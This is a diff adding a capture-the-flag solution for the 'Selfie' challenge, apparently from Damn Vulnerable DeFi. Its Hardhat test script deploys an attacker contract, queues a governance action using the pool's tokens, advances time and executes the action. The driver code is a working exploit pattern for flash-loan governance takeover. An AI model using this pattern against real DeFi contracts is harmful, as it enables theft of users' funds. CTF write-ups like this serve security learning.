@@ -103,3 +103,22 @@ contract HackRewarder {
     }
 }
 ```
+## Challenge #6 - Selfie
+
+selfie.challenge.js:
+```
+it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        const SelfieHackFactory = await ethers.getContractFactory('SelfieHack', attacker);
+        const SelfieHackContract = await SelfieHackFactory.deploy(this.pool.address,this.token.address, this.governance.address);
+
+        await SelfieHackContract.connect(attacker).attack(TOKENS_IN_POOL);
+        const actionId = ethers.BigNumber.from(await SelfieHackContract.connect(attacker).id());
+        
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // Advance in time 2 days
+        await this.governance.connect(attacker).executeAction(actionId);
+    });
+
+
+```
